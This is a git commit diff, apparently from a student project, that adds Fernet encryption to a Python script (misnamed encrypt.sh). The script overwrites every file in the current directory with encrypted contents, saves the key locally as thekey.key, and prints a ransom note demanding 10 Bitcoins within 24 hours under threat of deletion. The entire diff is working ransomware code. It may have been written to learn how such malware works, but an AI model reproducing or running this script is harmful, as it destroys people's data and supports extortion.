c1271487aa3886314de3c22d0eec50a5fca353d0
ababic20 <ababic20@foi.hr>
2023-12-15 19:05:34 +0100

    Encryption completed using Fernet

--- Implementation/encrypt.sh
+++ Implementation/encrypt.sh
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os
+from cryptography.fernet import Fernet
 
 files = []
 
@@ -10,3 +11,16 @@ for file in os.listdir():
 		files.append(file)
 
 print(files)
+
+key = Fernet.generate_key()
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+	
+
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents) 
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+print("Warning! All your files are encrypted. If you do not deposit 10 Bitcoins to this account 12345 in the next 24 hours, all files will be deleted.")
